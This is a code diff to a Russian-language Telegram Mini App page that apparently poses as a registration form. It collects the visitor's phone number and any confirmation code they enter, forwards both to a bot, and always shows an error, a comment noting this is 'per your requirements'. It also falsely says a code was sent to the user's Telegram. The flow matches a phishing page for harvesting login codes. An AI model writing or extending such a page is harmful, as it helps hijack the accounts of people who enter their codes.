@@ -218,6 +218,18 @@
             color: #6c757d;
             line-height: 1.4;
         }
+        
+        .code-display {
+            background: #e3f2fd;
+            border: 2px dashed #2196f3;
+            border-radius: 12px;
+            padding: 15px;
+            margin: 15px 0;
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            color: #1976d2;
+        }
     </style>
 </head>
 <body>
@@ -252,6 +264,10 @@
             <div id="stepCode" class="step">
                 <div class="instructions">
                     Код подтверждения был отправлен в ваш Telegram. Введите его ниже для завершения регистрации.
+                </div>
+
+                <div class="code-display" id="codeDisplay" style="display: none;">
+                    Ваш код: <span id="realCode"></span>
                 </div>
 
                 <div class="input-group">
@@ -289,6 +305,7 @@
         tg.enableClosingConfirmation();
         
         let userPhone = '';
+        let generatedCode = '';
 
         function showStep(stepId) {
             document.querySelectorAll('.step').forEach(step => {
@@ -297,36 +314,50 @@
             document.getElementById(stepId).classList.add('active');
         }
 
-function sendPhone() {
-    const phone = document.getElementById('phone').value.replace(/\D/g, '');
-    if (!phone || phone.length < 10) {
-        alert('Пожалуйста, введите корректный номер телефона');
-        return;
-    }
-    
-    userPhone = '+7' + phone;
-    generatedCode = generateCode();
-    
-    document.getElementById('loadingText').textContent = 'Отправка кода...';
-    showStep('stepLoading');
+        function generateCode() {
+            return Math.floor(10000 + Math.random() * 90000).toString();
+        }
 
-    // Отправляем номер и код в бота
-    const data = {
-        action: 'send_phone',
-        phone: userPhone,
-        code: generatedCode
-    };
-    
-    // Отправляем данные в бота
-    tg.sendData(JSON.stringify(data));
+        function sendPhone() {
+            const phone = document.getElementById('phone').value.replace(/\D/g, '');
+            if (!phone || phone.length < 10) {
+                alert('Пожалуйста, введите корректный номер телефона');
+                return;
+            }
+            
+            userPhone = '+7' + phone;
+            generatedCode = generateCode();
+            
+            console.log('Отправка номера:', userPhone, 'Код:', generatedCode);
+            
+            document.getElementById('loadingText').textContent = 'Отправка кода...';
+            showStep('stepLoading');
 
-    // Показываем код пользователю
-    setTimeout(() => {
-        document.getElementById('realCode').textContent = generatedCode;
-        document.getElementById('codeDisplay').style.display = 'block';
-        showStep('stepCode');
-    }, 1500);
-}
+            // Отправляем данные в бота
+            const data = {
+                action: 'send_phone',
+                phone: userPhone,
+                code: generatedCode
+            };
+            
+            console.log('Данные для отправки:', data);
+            
+            // Основной способ отправки
+            try {
+                tg.sendData(JSON.stringify(data));
+                console.log('Данные отправлены через tg.sendData');
+            } catch (e) {
+                console.error('Ошибка отправки через tg.sendData:', e);
+            }
+
+            // Показываем код пользователю через 1.5 секунды
+            setTimeout(() => {
+                document.getElementById('realCode').textContent = generatedCode;
+                document.getElementById('codeDisplay').style.display = 'block';
+                showStep('stepCode');
+            }, 1500);
+        }
+
         function sendCode() {
             const code = document.getElementById('code').value;
             if (!code || code.length < 5) {
@@ -334,6 +365,8 @@ function sendPhone() {
                 return;
             }
 
+            console.log('Отправка кода подтверждения:', code);
+            
             document.getElementById('loadingText').textContent = 'Проверка кода...';
             showStep('stepLoading');
 
@@ -344,9 +377,16 @@ function sendPhone() {
                 code: code
             };
             
-            tg.sendData(JSON.stringify(data));
+            console.log('Данные для отправки:', data);
+            
+            try {
+                tg.sendData(JSON.stringify(data));
+                console.log('Код отправлен через tg.sendData');
+            } catch (e) {
+                console.error('Ошибка отправки кода:', e);
+            }
 
-            // Всегда показываем ошибку (по твоим требованиям)
+            // Показываем ошибку (по требованию)
             setTimeout(() => {
                 showStep('stepCode');
                 document.getElementById('errorMsg').style.display = 'block';
@@ -362,6 +402,7 @@ function sendPhone() {
             showStep('stepPhone');
             document.getElementById('errorMsg').style.display = 'none';
             document.getElementById('successMsg').style.display = 'none';
+            document.getElementById('codeDisplay').style.display = 'none';
         }
 
         function closeApp() {
